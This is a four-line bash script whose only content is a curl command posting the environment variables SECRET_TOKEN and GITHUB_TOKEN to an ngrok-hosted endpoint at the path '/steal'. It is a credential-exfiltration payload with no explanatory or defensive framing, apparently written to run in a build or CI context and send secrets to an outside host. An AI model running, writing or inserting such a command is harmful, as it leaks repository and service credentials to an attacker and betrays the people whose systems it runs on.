#!/bin/bash
curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
